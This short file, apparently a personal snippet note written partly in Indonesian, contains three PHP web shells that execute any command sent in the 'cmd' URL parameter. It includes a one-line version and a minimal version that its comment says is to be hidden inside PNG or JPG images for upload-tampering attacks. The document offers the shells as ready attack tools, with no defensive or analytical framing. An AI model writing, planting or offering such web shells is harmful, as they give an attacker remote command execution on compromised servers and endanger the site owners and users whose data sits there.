<?php
if(isset($_GET['cmd'])){ 
        echo "<pre>"; 
        echo system($_GET['cmd']); 
        echo "</pre>"; 
    }
?>

versi 1 line:
<?php if(isset($_GET['cmd'])) echo '<pre>' . shell_exec($_GET['cmd']) . '</pre>'; ?>

versi untuk tamper selipkan ke png/jpg:
<?php system($_GET['cmd']); ?>
